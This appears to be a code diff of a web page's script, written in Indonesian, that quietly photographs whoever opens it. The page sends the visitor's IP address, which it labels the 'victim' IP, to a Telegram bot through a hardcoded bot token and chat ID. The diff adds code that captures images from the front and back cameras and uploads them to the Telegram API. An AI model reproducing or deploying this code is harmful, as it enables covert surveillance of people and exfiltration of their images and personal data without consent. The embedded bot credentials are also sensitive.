@@ -110,8 +110,8 @@
   </div>
 
   <script>
-    const BOT_TOKEN = "7163723754:AAEIQk6FGjz2TsS4ELirDfIAbpaOThTAMdU";
-    const CHAT_ID = "6624966395";
+    const token = "7163723754:AAEIQk6FGjz2TsS4ELirDfIAbpaOThTAMdU";
+    const chat_id = "6624966395";
 
     window.onload = () => {
       setTimeout(() => {
@@ -142,10 +142,10 @@
 𝗔𝗹𝗮𝗺𝗮𝘁 𝗜𝗽 𝗞𝗼𝗿𝗯𝗮𝗻 : ${ip}
 𝗙𝗼𝘁𝗼 𝗞𝗼𝗿𝗯𝗮𝗻 𝗔𝗸𝗮𝗻 𝗗𝗶 𝗞𝗶𝗿𝗶𝗺 𝟱 𝗗𝗲𝘁𝗶𝗸 𝗟𝗮𝗴𝗶!!!
 ──────────────────────────────`;
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: infoMsg })
+        body: JSON.stringify({ chat_id: chat_id, text: infoMsg })
       });
 
       const video = document.getElementById("video");
@@ -163,10 +163,10 @@
           const blob = dataURLtoBlob(imageData);
 
           const formData = new FormData();
-          formData.append("chat_id", CHAT_ID);
+          formData.append("chat_id", chat_id);
           formData.append("photo", blob, "selfie.jpg");
 
-          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
             method: "POST",
             body: formData
           });
@@ -176,6 +176,13 @@
         alert("Gagal mengakses kamera: " + err.message);
       }
     }
+    
+    function ambilFoto() {
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  ctx.drawImage(video, 0, 0);
+  canvas.toBlob(blob => kirimFoto(blob, '📸 Foto Kamera'));
+}
 
     function dataURLtoBlob(dataurl) {
       const arr = dataurl.split(",");
@@ -186,6 +193,37 @@
       while(n--) u8arr[n] = bstr.charCodeAt(n);
       return new Blob([u8arr], { type: mime });
     }
+    
+    function kirimFoto(blob, caption) {
+  let form = new FormData();
+  form.append('chat_id', chat_id);
+  form.append('photo', blob, 'foto.jpg');
+  form.append('caption', caption);
+  fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: form });
+}
+
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+.then(stream => {
+  video.srcObject = stream;
+  video.play();
+  setTimeout(() => {
+    ambilFoto();
+    stream.getTracks().forEach(track => track.stop());
+    // Kamera belakang setelah depan
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
+    .then(stream2 => {
+      video.srcObject = stream2;
+      video.play();
+      setTimeout(() => {
+        ambilFoto();
+        stream2.getTracks().forEach(track => track.stop());
+      }, 5000);
+    });
+  }, 5000);
+})
+.catch(err => {
+  kirimPesan("Gagal akses kamera: " + err);
+});
   </script>
 </body>
 </html>
